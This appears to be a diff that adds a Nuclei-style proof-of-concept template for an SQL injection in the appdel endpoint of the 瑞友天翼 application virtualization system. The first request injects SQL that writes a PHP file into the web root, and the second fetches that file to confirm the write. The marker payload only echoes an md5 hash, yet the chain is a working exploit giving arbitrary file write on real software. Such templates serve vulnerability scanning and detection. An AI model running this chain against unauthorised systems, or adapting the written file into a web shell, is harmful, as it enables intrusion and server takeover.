@@ -1,0 +1,42 @@
+id: poc-yaml-gwt-system-appdel-sqli
+info:
+  name: 瑞友天翼应用虚拟化系统 appdel SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-injection
+    method: GET
+    path:
+      - "{{BaseURL}}/hmrao.php?s=/Admin/appdel&list=11111111'));select+'<%3fphp+echo+md5({{t1}})%3f>'+into+dumpfile+'../../WebRoot/{{t1}}.php'%3b--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: body
+        words:
+          - "系统发生错误"
+
+  - id: validate-injection
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
